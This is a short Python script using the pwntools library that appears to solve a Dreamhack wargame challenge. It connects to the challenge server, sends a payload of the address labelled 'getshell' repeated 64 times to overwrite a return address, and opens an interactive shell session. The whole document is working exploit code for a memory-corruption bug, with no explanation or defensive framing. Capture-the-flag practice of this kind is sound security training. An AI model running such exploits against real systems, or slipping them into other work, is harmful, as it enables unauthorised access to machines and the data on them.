from pwn import *

r=remote("host2.dreamhack.games",20305)
print("remote success")
getshell=0x080485db

payload=p32(getshell)*64

r.send(payload)
r.interactive()
